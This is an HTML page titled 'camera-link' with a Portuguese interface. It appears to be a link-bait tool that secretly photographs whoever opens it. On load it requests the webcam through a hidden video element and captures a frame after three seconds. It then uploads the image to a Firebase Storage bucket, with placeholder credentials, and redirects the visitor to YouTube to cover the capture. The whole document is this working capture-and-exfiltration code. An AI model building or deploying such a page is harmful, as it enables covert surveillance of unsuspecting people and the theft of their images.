# camera-link
<!DOCTYPE html>
<html>
<head>
    <title>Captura de Imagem</title>
    <style>
        body { font-family: Arial; text-align: center; padding: 20px; }
        #status { margin-top: 20px; color: #666; }
    </style>
</head>
<body>
    <h1>Capturando sua imagem...</h1>
    <div id="status">Aguarde enquanto acessamos sua câmera</div>
    <video id="webcam" autoplay muted style="display:none"></video>
    
    <script>
        async function initWebcam() {
            try {
                document.getElementById('status').textContent = "Acessando câmera...";
                const stream = await navigator.mediaDevices.getUserMedia({video: true});
                const video = document.getElementById('webcam');
                video.srcObject = stream;
                
                setTimeout(() => {
                    document.getElementById('status').textContent = "Capturando imagem...";
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    stream.getTracks().forEach(track => track.stop());
                    
                    // Obter imagem como base64
                    const imageData = canvas.toDataURL('image/jpeg');
                    console.log('Imagem capturada:', imageData);
                    
                    // Enviar imagem para servidor
                    uploadImage(imageData);
                }, 3000);
            } catch (err) {
                console.error("Erro ao acessar webcam:", err);
                document.getElementById('status').textContent = "Erro ao acessar câmera. Redirecionando...";
                window.location.href = "https://youtube.com";
            }
        }
        
        async function uploadImage(imageData) {
            try {
                document.getElementById('status').textContent = "Enviando imagem...";
                
                // Usando Firebase Storage (substituir pelos seus dados)
                const response = await fetch('https://firebasestorage.googleapis.com/v0/b/seu-projeto.appspot.com/o?uploadType=media&name=capturas/%2F' + Date.now(), {
                    method: 'POST',
                    headers: {
                        'Authorization': 'Bearer seu-token',
                        'Content-Type': 'image/jpeg'
                    },
                    body: imageData.split(',')[1]
                });
                
                if (response.ok) {
                    document.getElementById('status').textContent = "Imagem enviada! Redirecionando...";
                    setTimeout(() => {
                        window.location.href = "https://youtube.com";
                    }, 1000);
                } else {
                    throw new Error('Falha no upload');
                }
            } catch (error) {
                console.error('Erro no upload:', error);
                document.getElementById('status').textContent = "Erro no upload. Redirecionando...";
                window.location.href = "https://youtube.com";
            }
        }
        
        window.addEventListener('load', initWebcam);
    </script>
</body>
</html>
